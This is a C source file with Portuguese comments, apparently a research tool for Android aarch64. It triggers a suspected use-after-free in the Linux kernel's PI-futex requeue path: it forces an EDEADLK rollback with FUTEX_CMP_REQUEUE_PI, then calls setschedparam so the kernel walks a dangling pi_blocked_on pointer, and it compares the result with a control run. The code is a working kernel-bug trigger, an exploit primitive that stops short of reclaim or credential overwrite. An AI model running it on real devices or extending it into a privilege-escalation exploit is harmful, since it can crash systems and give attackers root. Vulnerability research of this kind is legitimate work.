/*
 * ghostlock_uaf_check.c — Fase 3: validador de UAF, RAM-only, 1 shot.
 *
 * Pergunta: apos o rollback EDEADLK, o pi_blocked_on do waiter continua
 * apontando para o frame liberado (vulneravel) ou foi limpo (corrigido)?
 *
 * Desenho (sem reclaim, sem escrita, sem cred):
 *  - perna CONTROL: trio waiter/owner SEM cmp (waiter acorda por timeout,
 *    estado limpo), waiter segue VIVO dormindo, setschedparam nele.
 *  - perna VULN: trio + CMP_REQUEUE_PI -> EDEADLK (rollback), teardown
 *    limpo, waiter segue VIVO dormindo com frame liberado, mesmo
 *    setschedparam nele.
 *  - controle roda primeiro; anomalia no controle ABORTA a perna vuln.
 *  - waiter nunca da join antes do consume: join mata a task e o
 *    dangling junto. thread destacada + cancel no fim.
 *
 * Sinal: consumer na VULN percorre pi_blocked_on pendurado (conteudo
 * estagnado) vs CONTROL (nunca bloqueada -> caminho rapido ret 0).
 * Sem reclaim o frame costuma intacto: walk benigno; panico possivel,
 * improvavel (janela de ms, sem spray). Aparelho de pesquisa com
 * recuperacao fisica. Nada persiste.
 *
 * Build: aarch64-linux-android28-clang -O2 -Wall -static
 *   ghostlock_uaf_check.c -o ghostlock_uaf_check
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif
#ifndef EDEADLK
#define EDEADLK 35
#endif

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;
    /* vivo e parado: frame antigo sem reuso, task com estado final */
    sleep(60);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);
    return NULL;
}

/* consumer: troca de policy forca __sched_setscheduler completo no alvo */
static int consume(pthread_t wt, const char *tag) {
    struct sched_param p = { .sched_priority = 0 };
    int bad = 0;
    uint64_t t0 = now_ns();
    errno = 0;
    int r1 = pthread_setschedparam(wt, SCHED_BATCH, &p);
    int e1 = errno;
    uint64_t t1 = now_ns();
    errno = 0;
    int r2 = pthread_setschedparam(wt, SCHED_OTHER, &p);
    int e2 = errno;
    uint64_t t2 = now_ns();
    printf("[%s] batch ret=%d errno=%d(%s) %lluns | other ret=%d errno=%d(%s) %lluns\n",
           tag, r1, e1, r1 ? strerror(e1) : "ok",
           (unsigned long long)(t1 - t0), r2, e2,
           r2 ? strerror(e2) : "ok", (unsigned long long)(t2 - t1));
    if (r1 || r2)
        bad = 1;
    return bad;
}

static void reset(void) {
    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;
}

/* perna: use_cmp=0 controle (timeout), =1 vuln (EDEADLK). retorna 0 ok. */
static int leg(int use_cmp, const char *tag) {
    reset();
    pthread_t w, o;
    pthread_create(&w, NULL, waiter_fn, NULL);
    pthread_create(&o, NULL, owner_fn, NULL);
    while (!w_waiting || !o_started)
        usleep(1000);
    int cmpe = 0;
    if (use_cmp) {
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        cmpe = errno;
        printf("[%s] cmp_errno=%d (%s)\n", tag, cmpe, strerror(cmpe));
    } else {
        usleep(1300000); /* waiter acorda sozinho por timeout */
    }
    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);
    int spins = 0;
    while (!w_done && spins++ < 100)
        usleep(20000);
    if (!w_done) {
        printf("[%s] ABORT: waiter nao voltou (w_done=0)\n", tag);
        return -1;
    }
    int bad = consume(w, tag);
    pthread_detach(w); /* processo sai e leva tudo; nada persiste */
    if (use_cmp && cmpe != EDEADLK)
        printf("[%s] WARN: sem EDEADLK, rollback nao atingido\n", tag);
    return bad;
}

int main(void) {
    setbuf(stdout, NULL); /* panic mata o buffer libc: sem flush, sem evidencia */
    printf("[info] uaf validator: control -> vuln, 1 shot cada\n");
    int rc = leg(0, "control");
    if (rc) {
        printf("[verdict] ABORT: controle anomalo, vuln nao executada\n");
        return 2;
    }
    rc = leg(1, "vuln");
    printf("[verdict] done control=ok vuln_ret=%d (0=consumer limpo; comparar tempos/errnos acima)\n",
           rc);
    return 0;
}
